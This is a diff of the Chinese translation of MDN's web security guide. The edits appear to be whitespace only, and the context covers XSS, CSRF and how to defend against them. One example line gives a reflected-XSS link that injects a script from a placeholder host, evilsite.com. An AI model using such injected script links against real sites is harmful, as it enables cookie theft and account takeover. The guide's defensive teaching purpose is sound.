@@ -45,7 +45,7 @@ translation_of: Learn/Server-side/First_steps/Website_security
 
 <p>这个部分列举了常见网站攻击手段以及如何减轻它们带来的危害。当你读的时候请注意，这些攻击是如何得手的，当 web 应用相信这些来自浏览器的信息或者不够坚持自己的时候。</p>
 
-<h3 id="跨站脚本_XSS">跨站脚本 (XSS)</h3>
+<h3 id="跨站脚本_XSS">跨站脚本 (XSS)</h3>
 
 <p>XSS 是一个术语，用来描述一类允许攻击者通过网站将客户端脚本代码注入到其他用户的浏览器中的攻击手段。由于注入到浏览器的代码来自站点，其是可信赖的，因此可以做类似将该用户用于站点认证的 cookie 发送给攻击者的事情。一旦攻击者拿到了这个 cookie，他们就可以登陆到站点，就好像他们就是那个用户，可以做任何那个用户能做的事情。根据站点的不同，这些可能包括访问他们的信用卡信息、查看联系人、更改密码等。</p>
 
@@ -59,7 +59,7 @@ translation_of: Learn/Server-side/First_steps/Website_security
  <li>反射型 XSS 攻击发生在当传递给服务器的用户数据被立即返回并在浏览器中原样显示的时候 -- 当新页面载入的时候原始用户数据中的任何脚本都会被执行！<br>
   <br>
   举个例子，假如有个站点搜索函数，搜索项被当作 URL 参数进行编码，这些搜索项将随搜索结果一同显示。攻击者可以通过构造一个包含恶意脚本的搜索链接作为参数（例如 <code>http://mysite.com?q=beer&lt;script%20src="http://evilsite.com/tricky.js"&gt;&lt;/script&gt; </code>），然后把链接发送给另一个用户。如果目标用户点击了这个链接，当显示搜索结果时这个脚本就会被执行。正如上述讨论的，这促使攻击者获取了所有需要以目标用户进入站点的信息 -- 可能会购买物品或分享联系人信息。<br>
-   </li>
+   </li>
  <li>持久型 XSS 攻击：恶意脚本存储在站点中，然后再原样地返回给其他用户，在用户不知情的情况下执行。<br>
   <br>
   举个例子，接收包含未经修改的 HTML 格式评论的论坛可能会存储来自攻击者的恶意脚本。这个脚本会在评论显示的时候执行，然后向攻击者发送访问该用户账户所需的信息。这种攻击类型及其常见而且有效，因为攻击者不需要与受害者有任何直接的接触。<br>
@@ -67,7 +67,7 @@ translation_of: Learn/Server-side/First_steps/Website_security
   尽管 <code>POST</code> 和 <code>GET</code> 方式获取到的数据是 XSS 攻击最常见的攻击来源，任何来自浏览器的数据都可能包含漏洞（包括浏览器渲染过的 Cookie 数据以及用户上传和显示的文件等).</li>
 </ul>
 
-<p> 防范 XSS 攻击的最好方式就是删除或禁用任何可能包含可运行代码指令的标记。对 HTML 来说，这些包括类似 <code>&lt;script&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>,和 <code>&lt;link&gt; </code>的标签。</p>
+<p> 防范 XSS 攻击的最好方式就是删除或禁用任何可能包含可运行代码指令的标记。对 HTML 来说，这些包括类似 <code>&lt;script&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>,和 <code>&lt;link&gt; </code>的标签。</p>
 
 <div>
 <p>修改用户数据使其无法用于运行脚本或其它影响服务器代码执行的过程被称作输入过滤。许多 Web 框架默认情况下都会对来自 HTML 表单的用户数据进行过滤。</p>
@@ -104,7 +104,7 @@ translation_of: Learn/Server-side/First_steps/Website_security
 <p><strong>Note</strong>: 本章节引用了大量来自 <a href="https://en.wikipedia.org/wiki/SQL_injection">Wikipedia </a>的内容。</p>
 </div>
 
-<h3 id="跨站请求伪造_CSRF">跨站请求伪造 (CSRF)</h3>
+<h3 id="跨站请求伪造_CSRF">跨站请求伪造 (CSRF)</h3>
 
 <p>CSRF 攻击允许恶意用户在另一个用户不知情的情况下利用其身份信息执行操作。</p>
 
@@ -148,9 +148,9 @@ translation_of: Learn/Server-side/First_steps/Website_security
 
 <ul>
  <li>采取更加强大的密码管理措施。当密码频繁更换时鼓励更加健壮的密码。采取双因素认证，也就是说除了密码，用户还应该输入另一种认证码（通常是只有唯一一个用户拥有的通过一些物理硬件传输的，比如发送给用户手机的验证短信）。</li>
- <li>将你的服务器配制成 <a href="/en-US/docs/Glossary/https">HTTPS</a> 和 <a href="/en-US/docs/Web/Security/HTTP_strict_transport_security">HTTP Strict Transport Security</a> (HSTS)。HTTPS 会加密你的用户和服务器之间传输的信息。这使得登录认证、cookise、POST 数据及头信息不易被攻击者获得。</li>
- <li>持续追踪那些常见的网络攻击 (the <a href="/en-US/docs/">current OWASP list is here</a>)，先解决最脆弱的部分。</li>
- <li>使用 <a href="https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools">vulnerability scanning tools</a> 来对你的网站进行一些安全测试 (然后，你的非常受欢迎的网站还可以靠提供赏金来寻找 bug，就像 Mozilla 这样（<a href="https://www.mozilla.org/en-US/security/bug-bounty/faq-webapp/">like Mozilla does here</a>）。</li>
+ <li>将你的服务器配制成 <a href="/en-US/docs/Glossary/https">HTTPS</a> 和 <a href="/en-US/docs/Web/Security/HTTP_strict_transport_security">HTTP Strict Transport Security</a> (HSTS)。HTTPS 会加密你的用户和服务器之间传输的信息。这使得登录认证、cookise、POST 数据及头信息不易被攻击者获得。</li>
+ <li>持续追踪那些常见的网络攻击 (the <a href="/en-US/docs/">current OWASP list is here</a>)，先解决最脆弱的部分。</li>
+ <li>使用 <a href="https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools">vulnerability scanning tools</a> 来对你的网站进行一些安全测试 (然后，你的非常受欢迎的网站还可以靠提供赏金来寻找 bug，就像 Mozilla 这样（<a href="https://www.mozilla.org/en-US/security/bug-bounty/faq-webapp/">like Mozilla does here</a>）。</li>
  <li>只存储和展示你不得不需要的东西。比如，如果你的用户不得不存储一些敏感信息（如信用卡详明），只展示足以让用户识别卡号的几位数字即可，却不足以让黑客复制之后在另一个站点使用。现今最常见的是只展示信用卡卡号后 4 位数字。</li>
 </ul>
 
